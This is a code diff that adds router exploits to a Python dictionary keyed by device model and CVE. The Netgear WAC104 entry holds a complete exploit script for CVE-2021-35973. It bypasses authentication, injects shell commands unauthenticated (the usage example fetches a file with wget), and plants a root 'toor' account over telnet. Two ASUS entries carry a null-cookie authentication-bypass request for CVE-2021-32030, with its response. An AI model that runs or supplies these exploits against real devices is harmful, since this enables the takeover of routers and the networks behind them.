@@ -885,4 +885,321 @@ if __name__ == "__main__":
 }
 
 
+model_exp_dic["Netgear_WAC104"] = {
+    "CVE-2021-35973":
+["NETGEAR WAC104 devices before 1.0.4.15 are affected by an authentication bypass vulnerability in /usr/sbin/mini_httpd, allowing an unauthenticated attacker to invoke any action by adding the &currentsetting.htm substring to the HTTP query, a related issue to CVE-2020-27866. This directly allows the attacker to change the web UI password, and eventually to enable debug mode (telnetd) and gain a shell on the device as the admin limited-user account (however, escalation to root is simple because of weak permissions on the /etc/ directory).\n['https://gynvael.coldwind.pl/?lang=en&id=736'\n'https://kb.netgear.com/000063785/Security-Advisory-for-Authentication-Bypass-on-WAC104-PSV-2021-0075']",
+ """
+import random
+import sys
+import socket
+import telnetlib
+import os
+import time
+import base64
+import threading
+from struct import pack, unpack
+
+DEBUG = False
+try:
+  HOST = sys.argv[1]
+  CMD = sys.argv[2]
+
+except:
+  print("python exp.py host cmd")
+  print("python exp.py 192.168.0.1 'wget http://192.168.0.8:9090/1111'")
+  exit(1)
+
+
+TEMP_PASSWORD = "SomeTempPwd1234"
+NEW_PASSWORD = "NewSetPwd1234"
+# Root (or rather toor) user's password is hardcoded.
+
+def recvuntil(sock, txt):
+  d = b""
+  while d.find(txt) == -1:
+    try:
+      dnow = sock.recv(1)
+      if len(dnow) == 0:
+        return ("DISCONNECTED", d)
+    except socket.timeout:
+      return ("TIMEOUT", d)
+    except socket.error as msg:
+      return ("ERROR", d)
+    d += dnow
+  return ("OK", d)
+
+def recvall(sock, n):
+  d = b""
+  while len(d) != n:
+    try:
+      dnow = sock.recv(n - len(d))
+      if len(dnow) == 0:
+        return ("DISCONNECTED", d)
+    except socket.timeout:
+      return ("TIMEOUT", d)
+    except socket.error as msg:
+      return ("ERROR", d)
+    d += dnow
+  return ("OK", d)
+
+# Proxy object for sockets.
+class gsocket(object):
+  def __init__(self, *p):
+    self._sock = socket.socket(*p)
+
+  def __getattr__(self, name):
+    return getattr(self._sock, name)
+
+  def recvall(self, n):
+    err, ret = recvall(self._sock, n)
+    if err != "OK":
+      return False
+    return ret
+
+  def recvuntil(self, txt):
+    err, ret = recvuntil(self._sock, txt)
+    if err != "OK":
+      return False
+    return ret
+
+  def recvuntilend(self):
+    k = []
+    while True:
+      d = self._sock.recv(10000)
+      if not d:
+        break
+      k.append(d)
+
+    return b''.join(k)
+
+def send_via_http(payload):
+  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((HOST, 80))
+
+  s.sendall(payload)
+
+  d = s.recvuntilend()
+  d = str(d, "cp852")
+
+  if DEBUG:
+    sys.stdout.write(d)
+    print("")
+
+  status = d.split("\n")[0].strip()
+  print(status)
+
+  #s.shutdown(socket.SHUT_RDWR)
+  s.close()
+
+  return status
+
+def reset_session_state_or_sth():
+  # I'm not really sure why this works, but it does.
+  status = send_via_http(
+    b'\r\n'.join([
+      b"GET /401_access_denied.htm HTTP/1.5",
+      b"Host: aplogin",
+      b"", b""
+    ])
+  )
+
+  if "200 OK" not in status:
+    sys.exit("ERROR: Something went wrong on the initial step.")
+
+def enable_debug_mode():
+  status = send_via_http(
+    b'\r\n'.join([
+      b"GET /setup.cgi?todo=debug%00currentsetting.htm HTTP/1.5",
+      b"Host: aplogin",
+      b"", b""
+    ])
+  )
+
+  if "200 OK" not in status:
+    sys.exit("ERROR: Something went when enabling telnet.")
+
+def change_nvram_password(new_password):
+  # This is an PoC exploit, so skipping any URL-encoding that should be done
+  # here.
+  new_password = bytes(new_password, "utf-8")
+  status = send_via_http(
+    b'\r\n'.join([
+      ( b"GET /setup.cgi?todo=con_save_passwd&"
+        b"sysNewPasswd=%s&sysConfirmPasswd=%s"
+        b"%%00currentsetting.htm HTTP/1.5" ) % (new_password, new_password),
+      b"Host: aplogin",
+      b"", b""
+    ])
+  )
+
+  if len(status):
+    print("WARN: This usually returns nothing. Weird.")
+
+def reboot():
+  send_via_http(
+    b'\r\n'.join([
+      b"POST /setup.cgi?id=0%00currentsetting.htm?sp=1234 HTTP/1.1",
+      b"Host: aplogin",
+      b"Content-Length: 11",
+      b"Content-Type: application/x-www-form-urlencoded",
+      b"",
+      b"todo=reboot"
+    ])
+  )
+
+def change_password_full(old_password, new_password):
+  old_password = bytes(old_password, "utf-8")
+  new_password = bytes(new_password, "utf-8")
+  post_body = (
+    b"sysOldPasswd=%s&sysNewPasswd=%s&sysConfirmPasswd=%s&"
+    b"question1=1&answer1=a&question2=1&answer2=a&"
+    b"todo=save_passwd&"
+    b"this_file=PWD_password.htm&"
+    b"next_file=PWD_password.htm&"
+    b"SID=&h_enable_recovery=disable&"
+    b"h_question1=1&h_question2=1"
+  ) % (old_password, new_password, new_password)
+
+  status = send_via_http(
+    b'\r\n'.join([
+      b"POST /setup.cgi?id=0%00currentsetting.htm?sp=1234 HTTP/1.1",
+      b"Host: aplogin",
+      b"Content-Length: %i" % len(post_body),
+      b"Content-Type: application/x-www-form-urlencoded",
+      b"",
+      post_body
+    ])
+  )
+
+  if "200 OK" not in status:
+    sys.exit("ERROR: Something went wrong when committing password.")
+
+def unauth_rce(cmd):
+  cmd = bytes(cmd, "utf-8")
+  post_body = (
+    b"policy_name=%s&"
+    b"todo=vpn_connect&"
+    b"next_file=PWD_password.htm"
+  ) % (cmd)
+
+  status = send_via_http(
+    b'\r\n'.join([
+      b"POST /setup.cgi?id=0%00currentsetting.htm?sp=1234 HTTP/1.1",
+      b"Host: aplogin",
+      b"Content-Length: %i" % len(post_body),
+      b"Content-Type: application/x-www-form-urlencoded",
+      b"",
+      post_body
+    ])
+  )
+
+  if "200 OK" not in status:
+    sys.exit("ERROR: Something went wrong when committing password.")
+
+
+
+def add_root_user(password):
+  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((HOST, 23))
+
+  t = telnetlib.Telnet()
+  t.sock = s
+
+  print(str(t.read_until(b"WAC104 login: "), "cp852"))
+  t.write(b"admin\n")
+
+  print(str(t.read_until(b"Password: "), "cp852"))
+  t.write(bytes(password, "utf-8") + b"\n")
+
+  print(str(t.read_until(b"$ "), "cp852"))
+  # Adds root user named "toor" with password "AlaMaKota1234".
+  t.write(
+    b"cd /tmp/etc\n"
+    b"cp passwd passwdx\n"
+    b"echo toor:scEOyDvMLIlp6:0:0::scRY.aIzztZFk:/sbin/sh >> passwdx\n"
+    b"mv passwd old_passwd\n"
+    b"mv passwdx passwd\n"
+    b"echo DONEMARKER\n"
+  )
+
+  print(str(t.read_until(b"DONEMARKER"), "cp852"))
+
+  t.close()
+
+def connect_as_root():
+  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((HOST, 23))
+
+  t = telnetlib.Telnet()
+  t.sock = s
+
+  print(str(t.read_until(b"WAC104 login: "), "cp852"))
+  t.write(b"toor\n")
+
+  print(str(t.read_until(b"Password: "), "cp852"))
+  t.write(b"AlaMaKota1234\n")
+
+  t.interact()
+  t.close()
+
+CMD = CMD.replace(" ","${IFS}")
+unauth_rce("\n"+CMD+"\n")
+ """
+ ]
+}
+
+
+model_exp_dic["ASUS_RT-AX56U"] = {
+    "CVE-2021-32030":
+    ["The administrator application on ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator interface. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of '\0' matches the device's default value of '\0' in some situations.\n['https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md'\n'https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/']",
+     """
+GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1
+Host: 192.168.1.107:8443
+Content-Length: 0
+User-Agent: asusrouter--
+Connection: close
+Referer: https://192.168.1.107:8443/
+Cookie: asus_token=\0Invalid; clickedItem_tab=0
+
+HTTP/1.0 200 OK
+Server: httpd/2.0
+Content-Type: application/json;charset=UTF-8
+Connection: close
+
+{
+"get_cfg_clientlist":[{"alias":"24:4B:FE:64:37:10","model_name":"GT-AC2900","ui_model_name":"GT-AC2900","fwver":"3.0.0.4.386_41793-gdb31cdc","newfwver":"","ip":"192.168.50.1","mac":"24:4B:FE:64:37:10","online":"1","ap2g":"24:4B:FE:64:37:10","ap5g":"24:4B:FE:64:37:14","ap5g1":"","apdwb":"","wired_mac":[
+...
+...
+}
+     """
+     ]
+}
+
+
+model_exp_dic["GT-AC2900"] = {
+    "CVE-2021-32030":
+    ["The administrator application on ASUS GT-AC2900 devices before 3.0.0.4.386.42643 allows authentication bypass when processing remote input from an unauthenticated user, leading to unauthorized access to the administrator interface. This relates to handle_request in router/httpd/httpd.c and auth_check in web_hook.o. An attacker-supplied value of '\0' matches the device's default value of '\0' in some situations.\n['https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md'\n'https://www.asus.com/Networking-IoT-Servers/WiFi-Routers/ASUS-Gaming-Routers/RT-AC2900/HelpDesk_BIOS/']",
+     """
+GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1
+Host: 192.168.1.107:8443
+Content-Length: 0
+User-Agent: asusrouter--
+Connection: close
+Referer: https://192.168.1.107:8443/
+Cookie: asus_token=\0Invalid; clickedItem_tab=0
+
+HTTP/1.0 200 OK
+Server: httpd/2.0
+Content-Type: application/json;charset=UTF-8
+Connection: close
+
+{
+"get_cfg_clientlist":[{"alias":"24:4B:FE:64:37:10","model_name":"GT-AC2900","ui_model_name":"GT-AC2900","fwver":"3.0.0.4.386_41793-gdb31cdc","newfwver":"","ip":"192.168.50.1","mac":"24:4B:FE:64:37:10","online":"1","ap2g":"24:4B:FE:64:37:10","ap5g":"24:4B:FE:64:37:14","ap5g1":"","apdwb":"","wired_mac":[
+...
+...
+}
+     """
+     ]
+}
+
 # print(model_exp_dic["TOTOLINK_A7000R"][0])
